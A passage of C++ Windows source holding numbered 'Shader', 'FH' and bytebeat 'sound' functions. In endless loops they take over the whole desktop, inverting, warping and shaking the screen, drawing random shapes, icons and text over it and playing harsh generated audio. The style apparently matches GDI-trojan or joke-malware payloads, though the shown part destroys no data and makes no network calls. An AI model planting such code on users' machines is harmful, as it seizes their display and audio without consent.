                rgbquad[x + w * y].rgb |= (5 + x * y + x + 5 ^ y * 5 & 5 | 5 * y) * 0x01030A;
            }
        }
        for (int y = 0; y < h; y += h / 10) {
            BitBlt(hdc, rand() % 50 - 25, y + rand() % 50 - 25, w, h / 10, hcdc, 0, y, SRCCOPY);
            Sleep(1);
        }
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader16(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += (x + y + y - 5 + y + 6 - 7 + x) * 0x010101;
            }
        }
        RotateDC(hdc, 9, { h / 2,w / 2 });
        StretchBlt(hdc, -100, -100, w + 200, h + 200, hcdc, 0, 0, w, h, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader17(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += (x * y + (x + y) | x) ^ (x + w * y);
            }
        }
        BitBlt(hdc, -10, 0, w, h, hcdc, 0, 0, NOTSRCERASE);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader18(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb = x*y^(x+w*y)|40;
            }
        }
        BitBlt(hdc, -5 + rand() % 10, -5 + rand() % 10, w, h, hcdc, 0, 0, NOTSRCERASE);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader19(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb |= x % ((x + 5 * y | 255 * 7 >> x) + 1);
            }
        }int rrr = h / (1 + rand() % 100);
        for (int y = 0; y < h; y += rrr) {
            BitBlt(hcdc, rand() % 50 - 25, y, w, rrr, hcdc, 0, y, SRCAND);
        }
        BitBlt(hdc, -5 + rand() % 10, -5 + rand() % 10, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader20(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t -= 20) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb >>= x >> (y + t) * (x + 5 * (y + t) >> 5) | 6767 * (y + t);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader21(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t -= 20) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += 5 & y + x * y | y;
            }
        }
        BitBlt(hcdc, 0, rand() % 5 - 3, w / 2, h, hcdc, 0, 0, SRCAND);
        BitBlt(hcdc, rand() % (w / 2), rand() % 5 - 3, w / 2, h, hcdc, 0, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader22(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t -= 20) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += 7 | x + y - y;
                rgbquad[x + w * y].r = 0;
            }
        }
        BitBlt(hdc, rand() % 10 - 5, rand() % 10 - 5, w, h, hcdc, 0, 0, SRCPAINT);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader23(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t -= 20) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += 0x123456 * (x * y);
            }
        }int rrr = w / (1 + rand() % 100);
        for (int x = 0; x < w; x += rrr) {
            BitBlt(hcdc, x, rand() % 50 - 25, rrr, h, hcdc, x, 0, SRCPAINT);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader24(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t -= 20) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb = 0x010101 * (rand() % 255);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCAND);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI FH1(LPVOID) {
    while (1) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(NULL);
        TRIVERTEX vertex[3];
        vertex[0].x = rand() % w;
        vertex[0].y = rand() % h;
        vertex[0].Red = 0x7800;
        vertex[0].Green = 0xb900;
        vertex[0].Blue = 0xf000;
        vertex[0].Alpha = 0;
        vertex[1].x = rand() % w;
        vertex[1].y = rand() % h;
        vertex[1].Red = 0xFFFF;
        vertex[1].Green = 0xFFFF;
        vertex[1].Blue = 0xFFFF;
        vertex[1].Alpha = 0;
        vertex[2].x = rand() % w;
        vertex[2].y = rand() % h;
        vertex[2].Red = 0xFFFF;
        vertex[2].Green = 0xFFFF;
        vertex[2].Blue = 0xFFFF;
        vertex[2].Alpha = 0;
        GRADIENT_TRIANGLE gTriangle;
        gTriangle.Vertex1 = 0;
        gTriangle.Vertex2 = 1;
        gTriangle.Vertex3 = 2;
        GradientFill(hdc, vertex, 3, &gTriangle, 1, GRADIENT_FILL_TRIANGLE);
        ReleaseDC(NULL, hdc);
        Sleep(100);
    }
}
DWORD WINAPI FH2(LPVOID) {
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int iw = GetSystemMetrics(11), ih = GetSystemMetrics(12);
        HDC hdc = GetDC(0);
        for (int x = 0; x < w; x += iw) {
            for (int y = 0; y < h; y += ih) {
                int rrr = rand() % 2; HICON hico = LoadIcon(rrr ? GetModuleHandle(0) : 0, rrr ? MAKEINTRESOURCE(IDI_ICON1) : lpIconNames[rand() % 6]);
                DrawIcon(hdc, x, y, hico);
                DestroyIcon(hico);
            }
        }
        ReleaseDC(0, hdc);
        Sleep(1000 + rand() % 1000);
    }
}
DWORD WINAPI FH3(LPVOID) {
    int x = 0, y = 0;
    int signX = 10, signY = 10;
    int agx = 0.01, agy = 0.01;
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        int size = 500;
        int edge1x = x + (size * cos(0 * PI / 180.f)), edge1y = y + (size * sin(0 * PI / 180.f));
        int edge2x = x + (size * (cos((360 / 5) * PI / 180.f))), edge2y = y + (size * sin((360 / 5) * PI / 180.f));
        int edge3x = x + (size * (cos(((360 / 5) * 2) * PI / 180.f))), edge3y = y + (size * sin(((360 / 5) * 2) * PI / 180.f));
        int edge4x = x + (size * (cos(((360 / 5) * 3) * PI / 180.f))), edge4y = y + (size * sin(((360 / 5) * 3) * PI / 180.f));
        int edge5x = x + (size * (cos(((360 / 5) * 4) * PI / 180.f))), edge5y = y + (size * sin(((360 / 5) * 4) * PI / 180.f));
        VERTEX vtx[] = {
            {edge5x,edge5y,0},
            {edge2x,edge2y,0},
            {edge4x,edge4y,0},
            {edge1x,edge1y,0},
            {edge3x,edge3y,0},
        };
        EDGE edges[] = {
            {0,1},
            {1,2},
            {2,3},
            {3,4},
            {4,0}
        };
        int totedg = sizeof(edges) / sizeof(edges[0]);
        for (int i = 0; i < totedg; i++) {
            _3D::DrawEdge(hdc,
                vtx[edges[i].vtx0].x + x, vtx[edges[i].vtx0].y + y,
                vtx[edges[i].vtx1].x + x, vtx[edges[i].vtx1].y + y, 20);
        }
        if (x <= 0)signX = 10;
        if (y <= 0)signY = 10;
        if (x + size*2 >= w)signX = -10;
        if (y + size*2 >= h)signY = -10;
        x += signX; y += signY;
        agx += 1; agy += 1;
    }
}
DWORD WINAPI FH4(LPVOID) {
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        SetTextColor(hdc, RndRGB);
        SetBkColor(hdc, RndRGB);
        HFONT font = CreateFontA(100, 0, 0, 0, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Sitka Display");
        HBITMAP old = (HBITMAP)SelectObject(hdc, font);
        int rrr = rand() % 9; TextOutA(hdc, rand() % w, rand() % h, texts[rrr], strlen(texts[rrr]));
        SelectObject(hdc, old);
        DeleteObject(font);
        ReleaseDC(0, hdc);
        Sleep(1);
    }
}
DWORD WINAPI FH5(LPVOID) {
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0); int rrr = rand() % 4;
        int num = (int)ExtractIconA(0, iconLibraryNames[rrr], -1);
        HICON Ico = ExtractIconA(0, iconLibraryNames[rrr], rand() % num);
        int iw = 4 * GetSystemMetrics(11), ih = GetSystemMetrics(12) * 4;
        DrawIconEx(hdc, rand() % w, rand() % h, Ico, rand() % iw, rand() % ih, 0, 0, DI_NORMAL);
        DestroyIcon(Ico); ReleaseDC(0, hdc);
        Sleep(1);
    }
}
DWORD WINAPI FH6(LPVOID) {
    int x = 0, y = 0, signX = 10, signY = 10;
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        x += signX, y += signY;
        HBRUSH hBrush = CreateSolidBrush(RndRGB);
        HBITMAP old = (HBITMAP)SelectObject(hdc, hBrush);
        Ellipse(hdc, x, y, x + 140, y + 140);
        if (x >= w) { signX = -20; signY += 5; }
        if (y >= h) { signY = -30; signX += 5; }
        if (x <= 0) { signX = 10; signY -= 5; }
        if (y <= 0) { signY = 20; signX -= 5; }
        SelectObject(hdc, old); DeleteObject(hBrush);
        ReleaseDC(0, hdc); Sleep(1);
    }
}
DWORD WINAPI FH7(LPVOID) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int size = 400 + ((1 + rand() % 14) * 100);
        int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;
        for (int i = 0; i < size; i += 100) {
            ci(x - i / 2, y - i / 2, i, i);
            Sleep(5);
        }
        Sleep(100);
    }
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = (2 * (t >> 4) ^ t >> (t >> 8 | t) + t * (int)(4000 / (double)(t & 4095))) & t << 2;
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 5 & t >> 5 | t * 3 & t >> 8 | t * 4 & t >> 10) - t % 16);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t >> 1 & t) & t >> 2) ? t : t & 3);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 3 / (t * t & 16384 ? 1 : 44) ^ t - (t >> 21)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(91 + (78 * (t & t >> 11) - t + 1) | t * rand());
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t + (t >> 5 | t) * t % ((t >> 2) ? (t >> 2) : 1));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ (t >> 6) * (t ^ 5 | t >> 3) & t * 3 & t * 8);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((int)(cos(t >> 12 & t ^ (t >> 2)) * 255) ^ t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 5 | t + (t >> 4 & t >> 2 & t << 7)) + (t >> 5 | t) | t >> (t * (t >> 12)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & t >> 5) - (t >> 5) ^ (t >> 5));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 13 - t >> 11) | t << 1);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ 3 * (t >> 5 * t | t >> (t >> 3)) | t >> (t >> 14 & t));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound13() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t + (t >> 4 | t) + (t ^ (t >> 4) + (t >> 4 | t >> 7)) | t >> (4 - (t >> 6)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound14() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t + (t >> 5 | t) - ((t >> 1) / 11));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound15() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(cbrt(t * (int)tan(t >> 4 | t >> 11 | t >> 2) - t | (2 * t)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound16() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(19 * (2 * t >> 43 | 15 * t >> 4));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound17() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(64 ^ (t >> 3 ^ t & t >> 3) - t + 114 * (t >> 5 | t >> 1 & 4) - t + (1919 ^ (t >> 8 | t >> 1 | t) | t) * 18);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound18() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t + (t >> 1 | t >> 2) ^ t >> 12) + (t >> 1) - (1 + t >> 1) - 1);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound19() {
    HWAVEOUT hWaveOut = 0;
